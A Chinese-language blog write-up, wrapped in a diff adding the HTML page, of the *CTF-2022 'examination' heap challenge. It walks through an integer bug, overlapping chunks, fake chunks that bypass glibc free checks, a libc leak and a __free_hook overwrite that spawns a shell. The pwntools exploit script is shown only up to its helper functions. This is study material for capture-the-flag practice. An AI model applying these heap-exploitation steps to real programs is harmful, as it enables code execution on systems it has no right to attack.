@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>*CTF-2022 examination 题解 - 编程大白的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="*CTF-2022 examination 题解" />
+<meta property="og:description" content="源文件：my_github
+这是一道堆题，模拟了学生和老师的有趣生活。
+在这里，老师能干的事情有：添加学生、评分（分数随机，通常不超过10分）、为某一个学生写评语、叫家长（删除学生）。学生能干的事情有：做题（在本赛题中没有用）、查看评语、祈祷、设置模式（在本赛题中没有用）、修改要操作的学号。其中学生祈祷后，老师评分时能够发现，并吐槽一下，额外减10分。如果学生查看自己的分数发现大于89分，则可以获得奖励：获取到该学生信息的堆块地址，以及对任意地址的值加1（这种奖励每位学生只能获得一次）。
+首先，我们需要发现一个整型漏洞。注意到祈祷之后评分会额外扣10分，如果本来没有10分，扣除之后就成了负数。看一下汇编，这里的跳转指令用的是jbe，也就是无符号整数的比较，这样就形成了一个整型漏洞。扣这10分之后，我们就可以进行任一地址加1的操作了。这是本题中最为关键的操作，没有之一。
+在本题中，首先我们要获取libc的加载地址，好定位system函数。由于本题使用的glibc版本为2.31，因此任何小于0x400的chunk在释放时都会被存储到tcache中，而tcache chunk中并不包含任何glibc的偏移地址。这样，我们是无法知道glibc的偏移的。要想获得glibc地址，我们需要让一个chunk进入unsorted bin。这就需要使这个chunk的大小超过0x400。我们手中能用的手段只有任一地址加1，因此顺理成章地我们可以将这里的地址改大为0x500，这样就能够获得一个unsorted bin chunk了。
+但是，如果仅仅是单纯地这样修改，我们仍然无法对这个chunk进行有效地控制。因为free意味着删除学生，程序中删除学生会将对应位置的悬挂指针清零，使我们看上去失去了UAF的可能性。但是别忘了，任一地址加1也是一个很好的攻击武器。如果我们通过任意地址加1能够修改一个学生评语的指针，那会怎么样呢？我们可以让两个学生的评语指向同一个位置，这样就实现了UAF。
+经过实际验证，发现本程序中有很多需要注意的细节问题，需要把握好这些细节才能够拿到shell，否则程序容易崩溃退出。
+1. 学生数量问题
+从添加学生的程序中看出，学生最多只能有7个，而删除学生能够让计数器减1。
+2. 评分问题
+在评分的函数中，我们发现了一个程序bug。
+假如我们现在已经有了7名学生，删除第1名学生，其指针会变成空指针，计数器的值应为6。但是评分遍历时还是会遍历到第1名学生，就会导致段错误。为了防止这种情况的发生，我们每一次删除一名学生都必须删除最后一名学生。
+3. 地址写
+在任意地址写程序中，我们需要输入一个地址的10进制数。但是出题人在处理这个10进制数的时候没有处理好。本来read函数读取到换行结束，出题人应该是想把换行改成空字符，但是很不巧的是他改错了，将最后一位数字改成了空字符。这就需要我们每一次输入地址的时候都要在后面多输入一位无效数字，在比赛的时候这个小bug造成了一些不必要的时间浪费。（屑出题人）
+4. calloc
+本题中除了teacher端输入6调用了一个malloc之外，其他的内存分配均使用calloc，而calloc不会分配tcache中的chunk。
+注意到上面的限制条件之后，我们可以对步骤细化：
+Step 1: 构造学生4的评语在学生5、6评语之后，绕过删除评语5的检查
+Step 2: 奖励学生4，将学生5、6的评语（原大小：0x400）指向同一位置
+Step 3: 奖励学生6，使学生6评语大小改大0x100（利用学生6的奖励机会）
+Step 4: 删除学生6
+Step 5: 读取学生5评语获取libc地址
+Step 6: 将学生6添加回来
+Step 7: 用学生5覆写学生6的chunk指针到__free_hook
+Step 8: 为学生6写评语’/bin/sh’
+Step 9: 在__free_hook写入system地址
+Step 10: 用学生5覆写学生6的chunk指针返回到原来的位置
+Step 11: 删除学生6，getshell
+这里需要明确一点：在glibc 2.31的地盘，想要分配一个chunk到__free_hook是一件很难的事情。因为在分配前会对目标地址进行一系列的检查，具体参见我的how2heap学习第9篇文章。由于本题使用calloc作为内存分配函数，因此将tcache指针指向__free_hook也是无效的。因此，本题需要转换思路，直接修改写入评语的地址到__free_hook，即上述第7步。
+在上面的思路中，第10步运用了calloc函数的特性，需要我们对本程序堆内存的分配情况有充分的了解，下面进行解释：
+在bss段有一个长度为7的数组，存放学生信息的chunk指针，为描述方便，将这个数组中指针指向的chunk称为pointer chunk。每一个pointer chunk的大小均为0x30，其中只保存一个堆chunk指针，这个chunk指针指向的chunk保存的是该学生的分数、是否已经领取奖励的标志位、评语的chunk（以下称comment chunk）、评语chunk的长度等信息，大小为0x20，称其为header chunk（实际分配为0x18，最后8字节与后一个chunk的prev_size重合）。由于每一次添加学生时，两个chunk先后被分配，因此在一开始，不妨将7个学生均分配一次，这样堆空间中就会存在7个这样的结构：
+在后面，是我们申请的评语的chunk，一开始我们会申请3个评语chunk，大小分别为0x100,0x400,0x200，分别给学生5,6,4。其中学生5分配0x100是为了后续步骤中将学生5的评语指针修改至与学生6重合。
+由于在后期将学生6的chunk size改大0x100后需要free，因此在学生4的comment chunk中需要进行一定的构造以绕过检查。在学生4的comment chunk对应位置构造假chunk，这个假chunk头应该在学生6的comment chunk扩大0x100后其尾部的正后方，也即学生4 comment chunk头部向后偏移0x100处，构造如下内容：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bcdabai.github.io/posts/9f041ea4d47b7b61ddfd512926beb566/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-23T19:54:27+08:00" />
+<meta property="article:modified_time" content="2022-04-23T19:54:27+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程大白的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">*CTF-2022 examination 题解</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p>源文件：<a href="https://github.com/Hornos3/pwnfile">my_github</a></p> 
+<p>这是一道堆题，模拟了学生和老师的有趣生活。</p> 
+<p>在这里，老师能干的事情有：添加学生、评分（分数随机，通常不超过10分）、为某一个学生写评语、叫家长（删除学生）。学生能干的事情有：做题（在本赛题中没有用）、查看评语、祈祷、设置模式（在本赛题中没有用）、修改要操作的学号。其中学生祈祷后，老师评分时能够发现，并吐槽一下，额外减10分。如果学生查看自己的分数发现大于89分，则可以获得奖励：获取到该学生信息的堆块地址，以及对任意地址的值加1（这种奖励每位学生只能获得一次）。</p> 
+<p>首先，我们需要发现一个整型漏洞。注意到祈祷之后评分会额外扣10分，如果本来没有10分，扣除之后就成了负数。看一下汇编，这里的跳转指令用的是jbe，也就是无符号整数的比较，这样就形成了一个整型漏洞。扣这10分之后，我们就可以进行任一地址加1的操作了。这是本题中最为关键的操作，没有之一。</p> 
+<p><img src="https://images2.imgbox.com/a2/d2/z7Hw3jVl_o.png" alt=""></p> 
+<p>在本题中，首先我们要获取libc的加载地址，好定位system函数。由于本题使用的glibc版本为2.31，因此任何小于0x400的chunk在释放时都会被存储到tcache中，而tcache chunk中并不包含任何glibc的偏移地址。这样，我们是无法知道glibc的偏移的。要想获得glibc地址，我们需要让一个chunk进入unsorted bin。这就需要使这个chunk的大小超过0x400。我们手中能用的手段只有任一地址加1，因此顺理成章地我们可以将这里的地址改大为0x500，这样就能够获得一个unsorted bin chunk了。</p> 
+<p>但是，如果仅仅是单纯地这样修改，我们仍然无法对这个chunk进行有效地控制。因为free意味着删除学生，程序中删除学生会将对应位置的悬挂指针清零，使我们看上去失去了UAF的可能性。但是别忘了，任一地址加1也是一个很好的攻击武器。如果我们通过任意地址加1能够修改一个学生评语的指针，那会怎么样呢？我们可以让两个学生的评语指向同一个位置，这样就实现了UAF。</p> 
+<p>经过实际验证，发现本程序中有很多需要注意的细节问题，需要把握好这些细节才能够拿到shell，否则程序容易崩溃退出。</p> 
+<p><strong>1. 学生数量问题</strong></p> 
+<p><img src="https://images2.imgbox.com/3d/cf/M1tfXsA8_o.png" alt=""></p> 
+<p>从添加学生的程序中看出，学生最多只能有7个，而删除学生能够让计数器减1。</p> 
+<p><strong>2. 评分问题</strong></p> 
+<p><img src="https://images2.imgbox.com/5f/3e/Ycf2O79A_o.png" alt=""></p> 
+<p>在评分的函数中，我们发现了一个程序bug。</p> 
+<p>假如我们现在已经有了7名学生，删除第1名学生，其指针会变成空指针，计数器的值应为6。但是评分遍历时还是会遍历到第1名学生，就会导致段错误。为了防止这种情况的发生，我们每一次删除一名学生都必须删除最后一名学生。</p> 
+<p><strong>3. 地址写</strong></p> 
+<p><img src="https://images2.imgbox.com/dd/d9/g7MXWWhF_o.png" alt=""></p> 
+<p>在任意地址写程序中，我们需要输入一个地址的10进制数。但是出题人在处理这个10进制数的时候没有处理好。本来read函数读取到换行结束，出题人应该是想把换行改成空字符，但是很不巧的是他改错了，将最后一位数字改成了空字符。这就需要我们每一次输入地址的时候都要在后面多输入一位无效数字，在比赛的时候这个小bug造成了一些不必要的时间浪费。<s>（屑出题人）</s></p> 
+<p><strong>4. calloc</strong></p> 
+<p>本题中除了teacher端输入6调用了一个malloc之外，其他的内存分配均使用calloc，而calloc不会分配tcache中的chunk。</p> 
+<p>注意到上面的限制条件之后，我们可以对步骤细化：</p> 
+<p>Step 1: 构造学生4的评语在学生5、6评语之后，绕过删除评语5的检查<br> Step 2: 奖励学生4，将学生5、6的评语（原大小：0x400）指向同一位置<br> Step 3: 奖励学生6，使学生6评语大小改大0x100（利用学生6的奖励机会）<br> Step 4: 删除学生6<br> Step 5: 读取学生5评语获取libc地址<br> Step 6: 将学生6添加回来<br> Step 7: 用学生5覆写学生6的chunk指针到__free_hook<br> Step 8: 为学生6写评语’/bin/sh’<br> Step 9: 在__free_hook写入system地址<br> Step 10: 用学生5覆写学生6的chunk指针返回到原来的位置<br> Step 11: 删除学生6，getshell</p> 
+<p>这里需要明确一点：在glibc 2.31的地盘，想要分配一个chunk到__free_hook是一件很难的事情。因为在分配前会对目标地址进行一系列的检查，具体参见我的how2heap学习第9篇文章。由于本题使用calloc作为内存分配函数，因此将tcache指针指向__free_hook也是无效的。因此，本题需要转换思路，直接修改写入评语的地址到__free_hook，即上述第7步。</p> 
+<p>在上面的思路中，第10步运用了calloc函数的特性，需要我们对本程序堆内存的分配情况有充分的了解，下面进行解释：</p> 
+<p>在bss段有一个长度为7的数组，存放学生信息的chunk指针，为描述方便，将这个数组中指针指向的chunk称为pointer chunk。每一个pointer chunk的大小均为0x30，其中只保存一个堆chunk指针，这个chunk指针指向的chunk保存的是该学生的分数、是否已经领取奖励的标志位、评语的chunk（以下称comment chunk）、评语chunk的长度等信息，大小为0x20，称其为header chunk（实际分配为0x18，最后8字节与后一个chunk的prev_size重合）。由于每一次添加学生时，两个chunk先后被分配，因此在一开始，不妨将7个学生均分配一次，这样堆空间中就会存在7个这样的结构：</p> 
+<p><img src="https://images2.imgbox.com/66/27/ci24gbGL_o.png" alt=""><br> 在后面，是我们申请的评语的chunk，一开始我们会申请3个评语chunk，大小分别为0x100,0x400,0x200，分别给学生5,6,4。其中学生5分配0x100是为了后续步骤中将学生5的评语指针修改至与学生6重合。</p> 
+<p><img src="https://images2.imgbox.com/56/03/BKYG75lr_o.png" alt=""></p> 
+<p>由于在后期将学生6的chunk size改大0x100后需要free，因此在学生4的comment chunk中需要进行一定的构造以绕过检查。在学生4的comment chunk对应位置构造假chunk，这个假chunk头应该在学生6的comment chunk扩大0x100后其尾部的正后方，也即学生4 comment chunk头部向后偏移0x100处，构造如下内容：</p> 
+<p><img src="https://images2.imgbox.com/d5/6d/SEPzA2Ft_o.png" alt=""></p> 
+<p>这两个假chunk可用于绕过_int_free函数的检查：</p> 
+<pre><code class="prism language-C">// line 4316
+if (__glibc_unlikely (!prev_inuse(nextchunk)))
+  malloc_printerr ("double free or corruption (!prev)");
+
+// line 4320
+if (__builtin_expect (chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0)
+|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))
+  malloc_printerr ("free(): invalid next size (normal)");
+</code></pre> 
+<p>在此之后，将学生5的comment chunk指针改到学生6的comment chunk可写头部，将学生6的comment chunk改大0x100后释放。</p> 
+<p><img src="https://images2.imgbox.com/6a/36/7ols4579_o.png" alt=""></p> 
+<p>此时，我们使用stu5的指针可以获取到stu6 comment chunk的libc地址，因为此时这个chunk大小为0x500，在unsorted bin中。<br> 之后将stu6申请回来，由于calloc不会使用tcache，因此在comment chunks上方被释放到tcache中原stu6的pointer chunk和header chunk均不会被分配出来，而是会对stu6的comment chunk进行切割，从而也就能够使我们能通过stu5的指针对stu6的信息进行随意改写。我们先对stu6写评语：‘/bin/sh’，这个地址我们可以得到，就在stu6的header chunk之上，我们首先将计算得到的__free_hook地址写到stu6的header chunk中存放comment chunk指针的地方，这样可以在对stu6写评语时直接修改__free_hook的值。然后再对stu5写评语将stu6的comment chunk指针改回到原先写有’/bin/sh’的地方，再执行free函数即可getshell。</p> 
+<p><img src="https://images2.imgbox.com/5a/20/vQnkU01S_o.png" alt=""></p> 
+<p>payload:</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./examination'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+
+students <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
+reviews <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span>
+chunk_addr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
+scores <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
+current_role <span class="token operator">=</span> <span class="token number">0</span>
+current_sid <span class="token operator">=</span> <span class="token number">0</span>
+student_num <span class="token operator">=</span> <span class="token number">0</span>
+
+<span class="token keyword">def</span> <span class="token function">add_student</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">global</span> student_num
+	<span class="token keyword">assert</span><span class="token punctuation">(</span>current_role <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'enter the number of questions: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	students<span class="token punctuation">[</span>student_num<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
+	chunk_addr<span class="token punctuation">[</span>student_num<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'unknown'</span>
+	student_num <span class="token operator">+=</span> <span class="token number">1</span>
+
+<span class="token keyword">def</span> <span class="token function">give_score</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">assert</span><span class="token punctuation">(</span>current_role <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'marking testing papers.....\n'</span><span class="token punctuation">)</span>
+	sid <span class="token operator">=</span> <span class="token number">0</span>
+	<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+		s <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+		<span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token string">b'finish'</span><span class="token punctuation">:</span>
+			<span class="token keyword">break</span>
+		<span class="token keyword">elif</span> <span class="token string">b'score'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>
+			sid <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x30</span>
+			scores<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			scores<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">10</span>
+			<span class="token keyword">if</span> scores<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
+				scores<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">256</span>
+	
+<span class="token keyword">def</span> <span class="token function">write_review</span><span class="token punctuation">(</span>sid<span class="token punctuation">,</span> size<span class="token punctuation">,</span> comment<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> enter<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">assert</span><span class="token punctuation">(</span>current_role <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> students<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'which one? &gt; '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token keyword">if</span> reviews<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+		io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input the size of comment: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token keyword">if</span> enter<span class="token punctuation">:</span>
+		<span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
+			io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'enter your comment:'</span><span class="token punctuation">,</span> comment<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'enter your comment:'</span><span class="token punctuation">,</span> comment<span class="token punctuation">)</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
+			io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'enter your comment:'</span><span class="token punctuation">,</span> comment<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'enter your comment:'</span><span class="token punctuation">,</span> comment<span class="token punctuation">)</span>
+	reviews<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">=</span> comment
+
+<span class="token keyword">def</span> <span class="token function">call_parent</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">global</span> student_num
+	<span class="token keyword">assert</span><span class="token punctuation">(</span>current_role <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> students<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'which student id to choose?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	students<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>
+	reviews<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span>
+	student_num <span class="token operator">-=</span> <span class="token number">1</span>
+
+<span class="token keyword">def</span> <span class="token function">change_role</span><span class="token punctuation">(</span>role<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">global</span> current_role
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'role: &lt;0.teacher/1.student&gt;: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>role<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	current_role <span class="token operator">=</span> role
+
+<span class="token keyword">def</span> <span class="token function">check_review</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> offset<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">assert</span><span class="token punctuation">(</span>current_role <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
+	<span class="token keyword">if</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'Good'</span><span class="token punctuation">:</span>
+		c <span class="token operator">=</span> chunk_addr<span class="token punctuation">[</span>current_sid<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'add'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+		chunk_addr<span class="token punctuation">[</span>current_sid<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">0x10</span>		<span class="token comment"># get the address of chunk head instead of writable head</span>
+		io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'wherever you want! addr: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">+</span> address<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">pray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">assert</span><span class="token punctuation">(</span>current_role <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">change_sid</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">global</span> current_sid
+	<span class="token keyword">assert</span><span class="token punctuation">(</span>current_role <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> students<span class="token punctuation">[</span>sid<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">b'6'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'input your id: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	current_sid <span class="token operator">=</span> sid
+
+<span class="token keyword">def</span> <span class="token function">print_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'students: '</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>students<span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'reviews: '</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>reviews<span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'chunk_addr: '</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>chunk_addr<span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'scores: '</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>scores<span class="token punctuation">)</span>
